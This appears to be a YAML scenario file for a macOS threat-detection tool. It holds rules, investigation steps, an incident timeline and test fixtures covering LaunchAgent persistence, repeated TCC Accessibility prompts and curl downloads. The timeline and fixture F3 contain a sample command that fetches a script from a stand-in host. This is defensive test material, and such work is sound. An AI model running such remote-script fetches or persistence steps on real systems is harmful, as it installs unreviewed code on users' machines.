version: 1
build: dev-macos
scenario:
  name: Suspicious macOS Persistence
  description: LaunchAgents persistence with TCC prompts and unusual network fetches.
  owner: community
  tags: [macos, persistence, tcc]
severity: high
signals:
  - id: macos_unified_log
    label: macOS Unified Log (process, subsystem, category)
  - id: tcc_prompt
    label: TCC prompts (privacy consent dialogs)
  - id: net_fetch
    label: Network fetch (curl/wget) telemetry
rules:
  - id: RULE-LAUNCHAGENT
    title: LaunchAgent creation in user Library
    severity: medium
    techniques: ["T1547.001"]
    explanation: LaunchAgents in user Library can be used for persistence.
  - id: RULE-TCC-SPAM
    title: Repeated TCC prompts for Accessibility
    severity: high
    techniques: ["T1518.001"]
    explanation: Repeated TCC prompts may indicate attempts to gain accessibility access.
  - id: RULE-CURL-WGET
    title: Suspicious curl/wget download
    severity: medium
    techniques: ["T1105"]
    explanation: Command-line downloads of payloads from unfamiliar hosts.
actions:
  - id: ACT-INVEST
    title: Investigate persistence
    steps:
      - Review new LaunchAgents in ~/Library/LaunchAgents
      - Check associated executables and signatures
      - Identify parent process creating the plist
    notes: Remove only after confirming malicious intent; capture copies first.
  - id: ACT-TCC
    title: TCC prompt review
    steps:
      - Inspect TCC.db for recent prompts
      - Confirm user intent and application legitimacy
      - Look for repeated denied prompts
timeline:
  - time: "08:10:01"
    headline: LaunchAgent plist created
    detail: New plist observed in ~/Library/LaunchAgents/com.example.helper.plist
    severity: medium
  - time: "08:12:14"
    headline: Unknown binary executed from Downloads
    detail: Unsigned helper launched with user privileges.
    severity: high
  - time: "08:13:45"
    headline: TCC prompt for Accessibility
    detail: Application requested accessibility access twice.
    severity: high
  - time: "08:15:02"
    headline: curl download from unfamiliar host
    detail: curl https://uncatalogued.example/download.sh
    severity: medium
  - time: "08:17:20"
    headline: LaunchAgent reloaded
    detail: LaunchServices refreshed the new agent.
    severity: medium
fixtures:
  - id: F1
    expected: ["RULE-LAUNCHAGENT"]
    result: unknown
    event:
      path: "/Users/test/Library/LaunchAgents/com.example.helper.plist"
      user: "test"
      action: "create"
      mode: "0644"
  - id: F2
    expected: ["RULE-TCC-SPAM"]
    result: unknown
    event:
      subsystem: "com.apple.TCC"
      category: "prompt"
      prompt_for: "kTCCServiceAccessibility"
      app: "/Applications/Helper.app"
      user: "test"
  - id: F3
    expected: ["RULE-CURL-WGET"]
    result: unknown
    event:
      process: "curl"
      user: "test"
      url: "https://uncatalogued.example/download.sh"
      parent: "Terminal"
